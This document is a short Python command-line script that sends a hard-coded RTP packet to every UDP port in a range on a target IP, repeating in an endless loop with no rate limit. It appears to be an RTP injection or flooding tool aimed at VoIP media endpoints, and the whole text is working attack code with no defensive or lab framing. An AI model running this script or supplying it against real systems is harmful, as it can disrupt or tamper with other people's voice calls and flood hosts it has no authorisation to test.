import socket, argparse

parser = argparse.ArgumentParser(description="Spray simple RTP packets over a port range")
parser.add_argument("target", help="Target IP address")
parser.add_argument("start_port", type=int, help="First UDP port to spray")
parser.add_argument("end_port",   type=int, help="Last UDP port to spray")
args = parser.parse_args()

rtppacket=[0x80, 0x0, 0xee, 0x3c, 0x4, 0x42, 0xa2, 0xc1, 0xef, 0xa, 0x7, 0xde]
rtppacket+=[0x0 for _ in range(160)] 

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
while True:
    for port in range(args.start_port, args.end_port + 1):
        sock.sendto(bytes(rtppacket), (args.target, port))
